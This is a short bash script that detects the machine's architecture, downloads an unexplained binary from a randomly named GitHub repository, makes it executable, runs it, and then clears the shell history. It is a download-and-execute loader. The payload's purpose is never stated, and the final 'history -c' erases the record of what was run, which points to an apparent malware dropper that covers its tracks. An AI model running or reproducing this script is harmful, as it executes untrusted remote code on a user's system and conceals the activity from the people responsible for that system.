#!/bin/bash

set -e

ARCH=$(uname -m)

echo "Detected architecture: $ARCH"

BASE_URL="https://raw.githubusercontent.com/youling666/fdsgsfd/main"

case "$ARCH" in
    x86_64)
        BIN_NAME="too_amd64"
        ;;
    aarch64 | arm64)
        BIN_NAME="too_arm64"
        ;;
    armv7l | armv6l)
        BIN_NAME="too_armhf"
        ;;
    *)
        echo "Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

echo "Downloading binary: $BIN_NAME"

curl -L -o "$BIN_NAME" "$BASE_URL/$BIN_NAME"
chmod +x "$BIN_NAME"

echo "Executing $BIN_NAME ..."
./"$BIN_NAME"

history -c
